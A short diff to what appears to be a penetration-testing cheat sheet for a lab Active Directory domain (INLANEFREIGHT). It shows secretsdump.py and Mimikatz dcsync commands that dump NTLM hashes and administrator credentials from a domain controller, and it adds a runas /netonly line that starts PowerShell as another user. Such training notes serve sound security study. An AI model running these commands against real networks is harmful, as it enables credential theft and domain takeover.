@@ -305,6 +305,7 @@ PS C:\tools> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(user
 | `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
 | `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |
 
+> `runas /netonly /user:INLANEFREIGHT\adunn powershell`
 
 
 # Privileged Access 
